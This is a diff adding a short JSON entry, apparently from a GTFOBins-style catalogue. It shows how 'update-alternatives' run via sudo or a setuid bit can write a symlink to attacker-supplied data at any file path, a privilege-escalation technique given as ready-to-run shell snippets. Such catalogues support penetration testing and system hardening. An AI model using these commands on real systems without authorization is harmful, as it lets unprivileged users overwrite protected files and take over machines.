@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "Write in `$LFILE` a symlink to `$TF`.",
+        "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Write in `$LFILE` a symlink to `$TF`.",
+        "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
+      }
+    ]
+  }
+}
